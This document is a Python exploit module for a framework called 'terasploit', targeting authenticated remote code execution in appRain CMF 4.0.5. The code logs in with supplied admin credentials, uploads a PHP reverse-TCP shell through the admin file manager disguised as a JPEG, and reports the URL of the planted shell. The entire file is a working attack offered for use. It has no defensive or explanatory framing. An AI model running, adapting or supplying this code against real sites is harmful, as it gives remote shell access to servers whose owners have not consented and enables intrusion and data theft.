#######
# Module/Exploit: appRain CMF Authenticated Remote Code Execution
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.exploit import *

class TerasploitExploit(Exploit):
    
    module_type = 'exploit'
    payload = 'modules/payload/php/multi/reverse_tcp'
    encoder = None
    
    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'Module' : 'exploit',
                'Name' : 'appRain CMF Authenticated Remote Code Execution',
                'Module Author' : 'Handler4',
                'Exploit Author' : 'Ahmet Ãœmit BAYRAM',
                'Version' : '4.0.5',
                'Exploit-DB' : 'https://www.exploit-db.com/exploits/52041',
                
                'Description' : [
                    'appRain CMF version 4.0.5 authenticated remote code execution',
                    'vulnerability that allows attackers to upload a shell.'
                ]
            }
        )

        if info_only:
            return
        
        register_option ('exploit',opt=[
            OptURL.new('target',['','yes','url of the target']),
            OptPort.new('rport',opt=[80,'yes','target port (tcp)']),
            OptString.new('username','none',['','yes','username to use for authentication']),
            OptString.new('password','none',['','yes','password to use for authentication'])
        ])


    def exploit(self):
        try:
            target = self.GetOPT('target')
            username = self.GetOPT('username')
            password = self.GetOPT('password')
            rport = self.GetOPT('rport')
            shell = self.EncodeShell(self.encoder,self.payload.shell_content())

            scheme, hostname = self.ParseTarget(target,return_list=['scheme','hostname'])
            rand = f"{self.RandomName()}.inc"
        
            login_url = f'{scheme}://{hostname}:{rport}/admin/system'
            upload_url = f"https://{hostname}:{rport}/admin/filemanager/upload"
            
            shell_url = f'{scheme}://{hostname}:{rport}/uploads/filemanager/{rand}'
            Shell(shell_url).new()
            
            login_data = {'data[Admin][admin_id]' : username,'data[Admin][admin_password]':password}
            headers = {'Content-Type':'application/x-www-form-urlencoded'}

            info_print ('Logging in...')
            login_response = HTTP.session.post(login_url,data=login_data,headers=headers)
            if 'Logout' in login_response.text:
                info_print ('Logged in successfully.',type='green')
            else:
                info_print ('Failed to login.',type='red')
                HTTP().new()
                return 'session', False
            
            files = {'data[filemanager][image]': (rand, shell, 'image/jpeg')}
            data = {'submit':'Upload'}

            exploit = HTTP.session.post(upload_url,files=files, data=data)
            if exploit.status_code in self.good_status_code():
                info_print (f'Status code: {exploit.status_code}')
                info_print (f'Shell uploaded: {shell_url}')
                HTTP().new()
                return 'session', True
            else:
                info_print ('Exploit failed.',type='red')
                info_print (f'Status code: {exploit.status_code}')
                HTTP().new()
                return 'session', False
            
        except Exception as error:
            info_print (error,type='red')
            HTTP().new()
            return 'exception', True